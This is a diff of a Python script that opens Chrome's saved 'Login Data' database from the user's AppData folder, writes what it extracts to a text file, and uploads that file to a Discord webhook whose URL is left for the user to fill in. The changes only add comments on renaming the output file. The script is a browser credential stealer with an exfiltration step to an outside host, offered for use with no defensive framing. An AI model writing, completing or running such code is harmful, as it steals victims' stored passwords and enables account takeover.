@@ -7,7 +7,7 @@ data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Da
 login_db = os.path.join(data_path, 'Login Data')
 
 # open file to write information
-with open('chrome-information.txt', 'w') as f:
+with open('chrome-information.txt', 'w') as f: #If you want to you can change the name to anything you want
     # connecting to the database
     c = sqlite3.connect(login_db)
     cursor = c.cursor()
@@ -23,6 +23,6 @@ with open('chrome-information.txt', 'w') as f:
     c.close()
 
 # send file to Discord webhook
-with open('chrome-information.txt', 'rb') as f:
+with open('chrome-information.txt', 'rb') as f: #If you changed the name you need to put in the same name of the file here
     data = {'file': f}
     requests.post('YOUR WEBHOOK URL', files=data)
